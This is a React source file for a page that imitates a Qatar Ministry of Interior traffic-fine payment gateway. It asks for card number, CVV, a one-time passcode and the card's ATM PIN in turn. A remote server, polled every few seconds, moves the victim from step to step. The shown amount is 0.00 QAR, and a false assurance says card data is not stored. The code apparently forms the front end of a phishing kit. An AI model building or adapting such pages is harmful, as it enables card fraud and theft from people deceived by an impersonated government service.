import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  ShieldCheck,
  Lock,
  CreditCard,
  Loader2,
  CheckCircle2,
  AlertCircle
} from "lucide-react";

const QATAR_HEADER_IMAGE = "/qatar-header-full.jpg";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, isRTL } = useLanguage();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
      toast.error(lang === "ar" ? "يرجى إكمال جميع الحقول" : "Please fill all fields");
      return;
    }
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] rtl" dir="rtl">
      {/* Header Image */}
      <div className="w-full">
        <img src={QATAR_HEADER_IMAGE} alt="MOI Header" className="w-full h-auto object-contain shadow-sm" />
      </div>

      <main className="max-w-md mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="bg-[#8A1538] p-6 text-white text-center">
            <h1 className="text-xl font-bold">{lang === "ar" ? "بوابة الدفع الإلكتروني" : "Electronic Payment Gateway"}</h1>
            <p className="text-sm opacity-80 mt-1">{lang === "ar" ? "دفع المخالفات المرورية" : "Traffic Violations Payment"}</p>
          </div>

          <div className="p-6">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-5">
                <div className="flex justify-between items-center pb-4 border-b border-gray-100">
                  <span className="text-gray-600">{lang === "ar" ? "إجمالي المبلغ:" : "Total Amount:"}</span>
                  <span className="text-xl font-black text-[#8A1538]">0.00 QAR</span>
                </div>

                {error && (
                  <div className="p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs flex items-center gap-3">
                    <AlertCircle size={16} />
                    {error}
                  </div>
                )}

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                      placeholder="JOHN DOE"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "رقم البطاقة" : "Card Number"}</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        maxLength={16}
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] pl-10"
                        placeholder="0000 0000 0000 0000"
                        required
                      />
                      <CreditCard className="absolute left-3 top-3.5 text-gray-400" size={20} />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        placeholder="MM/YY"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-1">{lang === "ar" ? "الرمز السري (CVV)" : "CVV"}</label>
                      <input
                        type="password"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        maxLength={4}
                        placeholder="***"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div className="bg-blue-50 p-4 rounded-lg flex gap-3 items-start">
                  <ShieldCheck className="text-blue-600 flex-shrink-0" size={20} />
                  <p className="text-xs text-blue-800 leading-relaxed">
                    {lang === "ar" 
                      ? "يتم تشفير جميع بيانات الدفع الخاصة بك ومعالجتها بشكل آمن. نحن لا نقوم بتخزين تفاصيل بطاقتك الكاملة."
                      : "All your payment data is encrypted and processed securely. We do not store your full card details."}
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={submitCardMutation.isPending}
                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-colors flex justify-center items-center gap-2 shadow-lg"
                >
                  {submitCardMutation.isPending ? (
                    <Loader2 className="animate-spin" />
                  ) : (
                    <>
                      <Lock size={18} />
                      {lang === "ar" ? "إتمام عملية الدفع" : "Complete Payment"}
                    </>
                  )}
                </button>
              </form>
            )}

            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-20 text-center space-y-6">
                <Loader2 className="w-16 h-16 text-[#8A1538] animate-spin mx-auto" />
                <h3 className="text-xl font-bold text-gray-900">{lang === 'ar' ? 'جاري معالجة طلبك' : 'Processing Your Request'}</h3>
                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى الانتظار، يتم التحقق من بياناتك عبر بوابة الدفع الآمنة' : 'Please wait while we verify your details via secure gateway'}</p>
              </div>
            )}

            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-6">
                <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto">
                  <Lock size={32} />
                </div>
                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'رمز التحقق' : 'Verification Code'}</h3>
                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى إدخال الرمز المرسل لهاتفك' : 'Please enter the code sent to your phone'}</p>
                <input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full text-center text-3xl font-black tracking-[0.5rem] p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
                  placeholder="••••••"
                  maxLength={6}
                  required
                />
                <button
                  type="submit"
                  disabled={submitOtpMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center"
                >
                  {submitOtpMutation.isPending ? <Loader2 className="animate-spin" /> : (lang === 'ar' ? 'تأكيد' : 'Confirm')}
                </button>
              </form>
            )}

            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="text-center space-y-6">
                <div className="w-16 h-16 bg-[#8A1538]/10 text-[#8A1538] rounded-full flex items-center justify-center mx-auto">
                  <CreditCard size={32} />
                </div>
                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'رقم التعريف الشخصي' : 'ATM PIN'}</h3>
                <p className="text-gray-500 text-sm">{lang === 'ar' ? 'يرجى إدخال الرقم السري للبطاقة' : 'Please enter your card PIN'}</p>
                <input
                  type="password"
                  value={atmPin}
                  onChange={(e) => setAtmPin(e.target.value)}
                  className="w-full text-center text-3xl font-black tracking-[1rem] p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
                  placeholder="••••"
                  maxLength={4}
                  required
                />
                <button
                  type="submit"
                  disabled={submitAtmPinMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg flex items-center justify-center"
                >
                  {submitAtmPinMutation.isPending ? <Loader2 className="animate-spin" /> : (lang === 'ar' ? 'تأكيد' : 'Confirm')}
                </button>
              </form>
            )}

            {stage === "success" && (
              <div className="py-12 text-center space-y-6">
                <CheckCircle2 className="w-20 h-20 text-green-500 mx-auto" />
                <h3 className="text-3xl font-bold text-gray-900">{lang === 'ar' ? 'تم الدفع بنجاح' : 'Payment Successful'}</h3>
                <p className="text-gray-500">{lang === 'ar' ? 'تمت معالجة دفعتك بنجاح' : 'Your payment has been processed successfully'}</p>
                <button
                  onClick={() => navigate(isRTL ? "/ar" : "/")}
                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl hover:bg-black transition-all"
                >
                  {lang === 'ar' ? 'العودة للرئيسية' : 'Back Home'}
                </button>
              </div>
            )}

            {stage === "failed" && (
              <div className="py-12 text-center space-y-6">
                <AlertCircle className="w-20 h-20 text-red-500 mx-auto" />
                <h3 className="text-2xl font-bold text-gray-900">{lang === 'ar' ? 'فشلت عملية الدفع' : 'Payment Failed'}</h3>
                <p className="text-gray-500">{error || (lang === 'ar' ? 'حدث خطأ أثناء معالجة العملية' : 'An error occurred during processing')}</p>
                <button
                  onClick={() => setStage("card")}
                  className="bg-[#8A1538] text-white font-bold py-4 px-8 rounded-xl hover:bg-[#6D112C] transition-all"
                >
                  {lang === 'ar' ? 'المحاولة مرة أخرى' : 'Try Again'}
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="mt-8 flex justify-center gap-6 opacity-40 grayscale">
          <img src="/card-brands.png" alt="Payment Methods" className="h-8 object-contain" />
        </div>
      </main>
    </div>
  );
}
